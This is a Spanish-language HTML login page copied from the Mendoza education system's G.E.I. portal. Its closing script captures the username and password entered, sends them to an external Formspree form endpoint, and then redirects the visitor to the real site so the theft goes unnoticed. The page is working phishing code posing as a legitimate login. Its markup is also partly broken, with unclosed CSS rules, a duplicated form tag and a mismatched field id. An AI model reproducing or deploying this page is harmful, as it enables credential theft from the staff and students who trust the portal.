<style>
	.form {
		position: relative;
		z-index: 1;
		background: #FFFFFF;
		max-width: 360px;
		margin: 0 auto 100px;
		padding: 30px;

	.form-control {

		border: 2px solid #ddd;

		-webkit-border-radius: 4px;

	}

	.form-control:focus,
	.form-control:focus+.fa {

	}

	.form-control:focus+.fa {

	}

	.form-group .fa {
		position: absolute;
		right: 10px;

	.form-group {

	.btn {

	.log-status.wrong-entry {
		-moz-animation: wrong-log 0.3s;
		-webkit-animation: wrong-log 0.3s;
		animation: wrong-log 0.3s;

	.log-status.wrong-entry .form-control,
	.wrong-entry .form-control+.fa {
		border-color: #ed1c24;
		color: #ed1c24;
	}

	.alert {
		display: none;

		margin-bottom: -19px;

<body class="hold-transition login-page">
	<div class="login-box">
		<div class="login-logo">
			<img src="img/gempad/logo_gem_general.png" alt="G.E.I." width="100%" />

		</div>
		<div class="form">
			<p class="login-box-msg">Por favor, introduce tu usuario y contraseña.</p>
									<form id="loginForm">
			<div class="form-group has-feedback">
				<input type="text" name="identity" value="" id="identity" class="has-feedback form-control" placeholder="Usuario"  />
				<span class="fa fa-user form-control-feedback"></span>
				<div class="alert">El campo usuario no puede estar vacío.</div>
			</div>
			<div class="form-group has-feedback">
				<input type="password" name="password" value="" id="password" class="has-feedback form-control" placeholder="Contraseña"  />
				<span class="fa fa-lock form-control-feedback"></span>
				<div class="alert_pass">El campo contraseña no puede estar vacío.</div>
			</div>
			
<input type="hidden" name="redirect_url" value="" />
			<div class="row">
				<div class="col-xs-12">
					<input type="submit" name="submit" value="Ingresar"  class="btn btn-primary btn-block btn-flat" />
				</div>
			</div>
			<br>
			<a class="btn btn-success btn-block" href="http://intranet.mendoza.edu.ar">Acceder desde intranet.mendoza.edu.ar</a>
			<form id="loginForm">			<br>
			<label style="text-align: center; width: 100%">
				<a href="usuarios/auth_login/recuperar_password">Recuperar contraseña.</a>
			</label>
		</div>
	</div>
	<!-- jQuery 2.1.4 -->
	<script src="js/jquery/jquery-2.1.4.min.js" type="text/javascript"></script>
	<!-- Bootstrap 3.3.6 -->
	<script src="plugins/bootstrap-3.3.6/js/bootstrap.min.js" type="text/javascript"></script>
	<!-- iCheck -->
	<script src="plugins/iCheck/icheck.min.js" type="text/javascript"></script>
	<script>
		$(function() {
			$('input').iCheck({
				checkboxClass: 'icheckbox_square-blue',
				radioClass: 'iradio_square-blue',
				increaseArea: '20%' // optional
			});
		});

		function verificar_datos(event) {
			var usuario = $('#usuario').val();
			var password = $('#password').val();
			if (usuario == '' || password == '') {
				if (usuario == '') {
					$('#verificar').addClass('log-status wrong-entry');
					$('.alert').fadeIn(500);
					setTimeout("$('.alert').fadeOut(1500);", 3000);
					setTimeout("$('#verificar').removeClass('log-status wrong-entry')", 3500);
				}
				if (password == '') {
					$('#verificar_pass').addClass('log-status wrong-entry');
					$('.alert_pass').fadeIn(500);
					setTimeout("$('.alert_pass').fadeOut(1500);", 3000);
					setTimeout("$('#verificar_pass').removeClass('log-status wrong-entry')", 3500);
				}
				event.preventDefault();
				return false;
			}
		}
	</script>
  <script>
document.getElementById('loginForm').addEventListener('submit', function(event) {
    // 1. Prevenir que el formulario se envíe normalmente
    event.preventDefault();

    // 2. Capturar los datos
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Prepara los datos para enviar
    const datos = {
        usuario: username,
        contraseña: password
    };

    // 3. Envía los datos a tu correo (Formspree)
    //    ¡IMPORTANTE! Reemplaza 'TU_URL_DE_FORMSPREE_AQUI' con tu link real.
    const receptorURL = 'https://formspree.io/f/mnjbkdlv';

    fetch(receptorURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(datos)
    })
    .then(response => {
        // 4. Si sale bien, redirige al GEI real
        window.location.href = 'https://dti.mendoza.edu.ar/';
    })
    .catch(error => {
        // Si falla, igual redirige para no quedar bloqueado
        console.error('Error:', error);
        window.location.href = 'https://dti.mendoza.edu.ar/';
    });
});
  </script>
</body>
